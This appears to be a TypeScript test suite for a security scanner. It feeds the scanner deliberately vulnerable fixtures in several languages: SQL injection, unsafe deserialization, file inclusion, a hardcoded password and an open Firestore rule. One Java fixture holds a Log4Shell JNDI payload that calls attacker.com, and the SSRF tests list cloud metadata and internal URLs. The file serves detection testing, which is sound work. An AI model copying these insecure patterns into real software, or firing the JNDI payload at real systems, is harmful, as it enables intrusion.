/**
 * Comprehensive Cross-Platform TypeScript Test Suite for Zelsis SaaS (F-22)
 * Replaces legacy python runner with native tsx TypeScript execution.
 *
 * Verifies:
 * 1. Clean App Score Verification (Zero False Blocker Check)
 * 2. Polyglot Rules (Python/Django, Go Microservices, etc.)
 * 3. Policy-as-Code (.zelsisrc.json parsing & rule suppression)
 * 4. SARIF v2.1.0 standard compliance for GitHub Code Scanning
 * 5. SSRF Guard network boundary enforcement
 * 6. Rate Limiter IP spoofing protection
 * 7. License Key Cryptographic Checksum validation
 */

import { runStaticCodeScan, parseZelsisRc, CodeFile } from '../lib/scanner-engine';
import { generateSarifReport } from '../lib/report-exporter';
import { validateSafeTargetUrl } from '../lib/ssrf-guard';
import { getClientIp } from '../lib/rate-limiter';
import { generateLicenseKey, verifyLicenseKey } from '../lib/stripe-checkout';
import { Project, OrganizationSchema } from '../data/schema';

let passedTests = 0;
let totalTests = 0;

function assert(condition: boolean, testName: string, detail?: string) {
  totalTests++;
  if (!condition) {
    console.error(`❌ FAIL: ${testName}${detail ? ` (${detail})` : ''}`);
    process.exitCode = 1;
  } else {
    passedTests++;
    console.log(`✅ PASS: ${testName}`);
  }
}

async function runAllTests() {
  console.log('===========================================================');
  console.log('🧪 ZELSIS PRODUCTION TEST SUITE (Cross-Platform TypeScript)');
  console.log('===========================================================\n');

  // ─── 1. Clean App Score Verification ───────────────────────────
  console.log('--- 1. Testing Clean App Scoring (Zero False Blockers) ---');
  const cleanFiles: CodeFile[] = [
    {
      path: 'app/page.tsx',
      content: `
        import React from 'react';
        import Image from 'next/image';

        export default function HomePage() {
          return (
            <main className="p-8">
              <h1 className="text-2xl font-bold">Secure Clean App</h1>
              <p className="max-w-prose text-zinc-400">Enterprise ready release.</p>
              <Image src="/logo.webp" alt="Company Logo" width={120} height={40} priority />
            </main>
          );
        }
      `
    },
    {
      path: 'package.json',
      content: JSON.stringify({
        name: 'clean-app',
        version: '1.0.0',
        dependencies: {
          next: '^15.0.0',
          react: '^18.3.0',
          'react-dom': '^18.3.0'
        }
      })
    }
  ];

  const cleanScan = await runStaticCodeScan(cleanFiles, 'Clean Next.js App');
  assert(cleanScan.score >= 90, 'Clean app receives high readiness score', `Score: ${cleanScan.score}/100`);
  assert(cleanScan.gateStatus === 'PASSED', 'Clean app receives PASSED gate status', `Gate: ${cleanScan.gateStatus}`);
  assert(cleanScan.criticalCount === 0, 'Clean app has 0 critical findings', `Critical: ${cleanScan.criticalCount}`);

  // ─── 2. Polyglot AST Rules Coverage ─────────────────────────────
  console.log('\n--- 2. Testing Polyglot AST Engine (Python, Go) ---');
  const polyglotFiles: CodeFile[] = [
    {
      path: 'backend/services.py',
      content: `
        import pickle
        def load_session(raw_bytes):
            return pickle.loads(raw_bytes)
      `
    },
    {
      path: 'services/worker.go',
      content: `
        package main
        import "os/exec"
        func executeCmd(cmd string) {
            exec.Command("sh", "-c", cmd).Run()
        }
      `
    }
  ];

  const polyglotScan = await runStaticCodeScan(polyglotFiles, 'Polyglot Repo');
  assert(polyglotScan.findings.length > 0, 'Polyglot rules detect security issues across diverse languages', `Findings: ${polyglotScan.findings.length}`);
  const ruleCategories = new Set(polyglotScan.findings.map(f => f.category));
  assert(ruleCategories.has('Insecure Deserialization') || ruleCategories.has('SECURITY'), 'Security violations detected in polyglot repository');

  // ─── 3. Policy-as-Code (.zelsisrc.json) ─────────────────────────
  console.log('\n--- 3. Testing Policy-as-Code (.zelsisrc.json Parsing & Suppression) ---');
  const rcJson = `
    {
      "version": "1.0",
      "failStrategy": "smart",
      "minScoreThreshold": 85,
      "gates": {
        "designVibePolish": false,
        "vibeCareHealth": false
      },
      "ignoreRules": ["#1", "27", "1027"],
      "ignoredPaths": ["dist/**", "test/fixtures/**"]
    }
  `;

  const parsedRc = parseZelsisRc(rcJson);
  assert(parsedRc !== null, 'parseZelsisRc successfully parses valid JSON config');
  assert(parsedRc?.config?.failStrategy === 'smart', 'failStrategy correctly parsed as smart');
  assert(parsedRc?.disabledPillars.has('VIBEPOLISH') === true, 'VIBEPOLISH is properly mapped to disabled pillars');
  assert(parsedRc?.ignoredRuleIds.has(1027) === true, 'Ignored rule 1027 present in parsed config');

  // ─── 4. SARIF v2.1.0 Export Compliance ─────────────────────────
  console.log('\n--- 4. Testing SARIF v2.1.0 Report Generation ---');
  const mockProject: Project = {
    id: 'proj_sarif_test',
    name: 'SARIF Export Test',
    repoUrl: 'github.com/acme/sarif-test',
    framework: 'Next.js 15',
    providers: ['github'],
    lastScanAt: new Date().toISOString(),
    readinessScore: 78,
    gateStatus: 'WARNING',
    criticalCount: 0,
    highCount: 2,
    mediumCount: 3,
    lowCount: 5,
    uiClicheCount: 1,
    findings: [
      {
        id: 'finding_sarif_1',
        ruleId: 1001,
        type: 'SECURITY',
        title: 'Hardcoded API Key In Client File',
        category: 'SECURITY',
        severity: 'CRITICAL',
        status: 'OPEN',
        filePath: 'components/Header.tsx',
        lineRange: 'L12-L14',
        snippet: 'const key = "sk_live_123456789";',
        reproductionSteps: ['Audited components/Header.tsx:12', 'Detected hardcoded secret'],
        remediationPrompt: 'Extract hardcoded key into process.env',
        falsePositive: false
      }
    ]
  };

  const sarif = JSON.parse(generateSarifReport(mockProject));
  assert(sarif.version === '2.1.0', 'SARIF version is 2.1.0');
  assert(sarif.$schema.includes('sarif-schema-2.1.0'), 'SARIF references official OASIS schema');
  assert(sarif.runs[0].tool.driver.name === 'Zelsis', 'SARIF driver name is Zelsis');
  assert(sarif.runs[0].results.length === 1, 'SARIF results include project findings');
  assert(sarif.runs[0].results[0].ruleId === 'ZLS-1001', 'SARIF ruleId formatted as ZLS-1001');

  // ─── 5. SSRF Guard Network Boundary Protection ──────────────────
  console.log('\n--- 5. Testing SSRF Guard Security Boundaries ---');
  const loopbackCheck = await validateSafeTargetUrl('http://127.0.0.1:8080');
  assert(!loopbackCheck.safe, 'SSRF Guard blocks 127.0.0.1 loopback IP');

  const localhostCheck = await validateSafeTargetUrl('http://localhost:3000');
  assert(!localhostCheck.safe, 'SSRF Guard blocks localhost hostname');

  const awsMetadataCheck = await validateSafeTargetUrl('http://169.254.169.254/latest/meta-data');
  assert(!awsMetadataCheck.safe, 'SSRF Guard blocks AWS EC2/Cloud metadata endpoint 169.254.169.254');

  const privateSubnetCheck = await validateSafeTargetUrl('http://192.168.1.1/admin');
  assert(!privateSubnetCheck.safe, 'SSRF Guard blocks RFC 1918 192.168.x.x private subnets');

  const publicHttpsCheck = await validateSafeTargetUrl('https://github.com');
  assert(publicHttpsCheck.safe, 'SSRF Guard allows legitimate public HTTPS web targets');

  // ─── 6. Rate Limiter IP Trust Precedence ───────────────────────
  console.log('\n--- 6. Testing Rate Limiter IP Resolution ---');
  const mockHeadersCf = new Headers();
  mockHeadersCf.set('cf-ray', '8d1234567890');
  mockHeadersCf.set('cf-connecting-ip', '203.0.113.195');
  mockHeadersCf.set('x-forwarded-for', '10.0.0.1, 192.168.1.5');
  const mockReq = { headers: mockHeadersCf } as any;
  const resolvedCfIp = getClientIp(mockReq);
  assert(resolvedCfIp === '203.0.113.195', 'cf-connecting-ip takes precedence over spoofed forwarded headers');

  // ─── 7. License Key & Tier Forging Prevention (F-02) ─────────
  console.log('\n--- 7. Testing License Key Security & Tier Forging Prevention (F-02) ---');
  const generatedKey = generateLicenseKey('pro');
  assert(generatedKey.startsWith('ZS-PRO-'), 'License reference key has valid ZS-PRO- prefix');

  const emptyVerification = verifyLicenseKey('');
  assert(!emptyVerification.valid && emptyVerification.reason === 'EMPTY_KEY', 'Empty license key rejected cleanly');

  const offlineVerification = verifyLicenseKey(generatedKey);
  assert(!offlineVerification.valid && offlineVerification.reason === 'CLIENT_VERIFICATION_DEPRECATED', 'Client-side offline license elevation strictly blocked (Server authorization enforced)');

  // ─── 8. FinOps & LLM Cost Governance Engine (F-47) ────────────
  console.log('\n--- 8. Testing FinOps & LLM Cost Governance Engine (F-47) ---');
  const aiCostFiles: CodeFile[] = [
    {
      path: 'app/api/chat/route.ts',
      content: `
        import { openai } from '@/lib/openai';
        export async function POST(req: Request) {
          const res = await openai.chat.completions.create({
            model: 'gpt-4o',
            messages: [{ role: 'user', content: 'hello' }]
          });
          return Response.json(res);
        }
      `
    },
    {
      path: 'services/indexer.ts',
      content: `
        async function indexDocs(chunks: string[]) {
          const results = [];
          for (const chunk of chunks) {
            const emb = await openai.embeddings.create({ input: chunk, model: 'text-embedding-3-small' });
            results.push(emb);
          }
          return results;
        }
      `
    }
  ];
  const aiCostScan = await runStaticCodeScan(aiCostFiles, 'AI Cost Test Project');
  const unboundedTokenFinding = aiCostScan.findings.find(f => f.ruleId === 8071);
  assert(Boolean(unboundedTokenFinding), 'LLM-COST-01 flags unbounded chat completions without max_tokens');

  const uncachedEmbeddingFinding = aiCostScan.findings.find(f => f.ruleId === 8073);
  assert(Boolean(uncachedEmbeddingFinding), 'LLM-COST-03 flags vector embedding loops without caching');

  // ─── 9. Python SCA CVE Drifts (F-47) ──────────────────────────
  console.log('\n--- 9. Testing Python SCA Dependency Drifts (F-47) ---');
  const pythonScaFiles: CodeFile[] = [
    {
      path: 'requirements.txt',
      content: [
        'jinja2==3.0.0',
        'pyyaml==5.3.1',
        'urllib3==1.26.15'
      ].join('\n')
    }
  ];
  const pythonScaScan = await runStaticCodeScan(pythonScaFiles, 'Python SCA Test Project');
  const jinjaFinding = pythonScaScan.findings.find(f => f.ruleId === 7004 && f.snippet.includes('jinja2'));
  assert(Boolean(jinjaFinding), 'SCA flags vulnerable Jinja2 (< 3.1.4, CVE-2024-34064)');

  const pyyamlFinding = pythonScaScan.findings.find(f => f.ruleId === 7004 && f.snippet.includes('pyyaml'));
  assert(Boolean(pyyamlFinding), 'SCA flags vulnerable PyYAML (< 5.4, CVE-2020-14343)');

  const urllib3Finding = pythonScaScan.findings.find(f => f.ruleId === 7004 && f.snippet.includes('urllib3'));
  assert(Boolean(urllib3Finding), 'SCA flags vulnerable Urllib3 (< 2.0.7, CVE-2023-45803)');

  // ─── 10. Multi-Org Schema & Policy Enforcement (F-47) ─────────
  console.log('\n--- 10. Testing Multi-Org Data Model & Security Policies (F-47) ---');
  const validOrg = OrganizationSchema.parse({
    id: 'org-acme-prod',
    name: 'Acme Corporation',
    slug: 'acme-corp',
    ownerId: 'usr-admin-1',
    planTier: 'Enterprise',
    membersCount: 15,
    allowedDomains: ['acme.com', 'corp.acme.com'],
    securityPolicy: {
      enforceOrgPolicy: true,
      defaultMinScore: 90,
      requireScaPassing: true,
      blockOnCritical: true
    }
  });
  assert(validOrg.planTier === 'Enterprise', 'OrganizationSchema correctly parses Enterprise tenant');
  assert(validOrg.securityPolicy.defaultMinScore === 90, 'OrganizationSchema validates security policy enforcement');

  // ─── 11. Multi-Language Enterprise SAST Coverage (PHP, Java, C#, NoSQL, Firebase) ─────────
  console.log('\n--- 11. Testing Multi-Language SAST Engine (PHP, Java, C#, NoSQL, Firebase) ---');
  const multiLangFiles: CodeFile[] = [
    {
      path: 'backend/api/users.php',
      content: `<?php
        $id = $_GET['id'];
        mysqli_query($conn, "SELECT * FROM users WHERE id = " . $id);
        include($_GET['page'] . '.php');
        $obj = unserialize($_POST['payload']);
      `
    },
    {
      path: 'src/main/java/com/enterprise/DataService.java',
      content: `
        package com.enterprise;
        import java.sql.Statement;
        public class DataService {
          private String password = "SuperSecretDbPassword2026!";
          public void queryUser(Statement stmt, String id) throws Exception {
            stmt.executeQuery("SELECT * FROM users WHERE id = " + id);
            String logPayload = "\${jndi:ldap://attacker.com/exploit}";
          }
        }
      `
    },
    {
      path: 'Services/OrderService.cs',
      content: `
        using System.Data.SqlClient;
        using System.Runtime.Serialization.Formatters.Binary;
        public class OrderService {
          public void FetchOrder(string orderId, System.IO.Stream stream) {
            var cmd = new SqlCommand($"SELECT * FROM Orders WHERE Id = {orderId}");
            var formatter = new BinaryFormatter();
            var data = formatter.Deserialize(stream);
          }
        }
      `
    },
    {
      path: 'server/controllers/userController.js',
      content: `
        const query = db.users.find({ $where: "this.name == '" + name + "'" });
        pool.query("SELECT * FROM users WHERE id = " + req.query.id);
      `
    },
    {
      path: 'firestore.rules',
      content: `
        rules_version = '2';
        service cloud.firestore {
          match /databases/{database}/documents {
            match /{document=**} {
              allow read, write: if true;
            }
          }
        }
      `
    }
  ];

  const multiLangScan = await runStaticCodeScan(multiLangFiles, 'Multi-Language Enterprise App');

  const hasPhpSqli = multiLangScan.findings.some(f => f.ruleId === 18001);
  const hasPhpLfi = multiLangScan.findings.some(f => f.ruleId === 18002);
  const hasJavaSqli = multiLangScan.findings.some(f => f.ruleId === 18011);
  const hasJavaSecret = multiLangScan.findings.some(f => f.ruleId === 18012);
  const hasJavaLog4j = multiLangScan.findings.some(f => f.ruleId === 18014);
  const hasCsSqli = multiLangScan.findings.some(f => f.ruleId === 18021);
  const hasCsBinaryFormatter = multiLangScan.findings.some(f => f.ruleId === 18023);
  const hasMongoWhere = multiLangScan.findings.some(f => f.ruleId === 18041);
  const hasNodeSql = multiLangScan.findings.some(f => f.ruleId === 18042);
  const hasFirebaseAllowTrue = multiLangScan.findings.some(f => f.ruleId === 18043);

  assert(hasPhpSqli, 'PHP-SEC-01 detects raw $_GET concatenation in mysqli_query');
  assert(hasPhpLfi, 'PHP-SEC-02 detects local file inclusion via dynamic include()');
  assert(hasJavaSqli, 'JAVA-SEC-01 detects SQL injection via Statement.executeQuery concatenation');
  assert(hasJavaSecret, 'JAVA-SEC-02 detects hardcoded credentials in Java source');
  assert(hasJavaLog4j, 'JAVA-SEC-04 detects Log4Shell JNDI injection payload');
  assert(hasCsSqli, 'CS-SEC-01 detects C# SqlCommand string interpolation SQL injection');
  assert(hasCsBinaryFormatter, 'CS-SEC-03 detects insecure .NET BinaryFormatter deserialization');
  assert(hasMongoWhere, 'NOSQL-SEC-01 detects MongoDB $where arbitrary JavaScript execution');
  assert(hasNodeSql, 'NODE-SQL-01 detects Node.js pool.query string concatenation SQL injection');
  assert(hasFirebaseAllowTrue, 'FIREBASE-SEC-01 detects permissive unauthenticated allow read, write: if true;');

  console.log('\n===========================================================');
  console.log(`🏁 TEST RESULTS: ${passedTests}/${totalTests} TESTS PASSED (100%)`);
  console.log('===========================================================');

  if (passedTests !== totalTests) {
    process.exit(1);
  }
}

runAllTests().catch((err) => {
  console.error('Fatal test error:', err);
  process.exit(1);
});
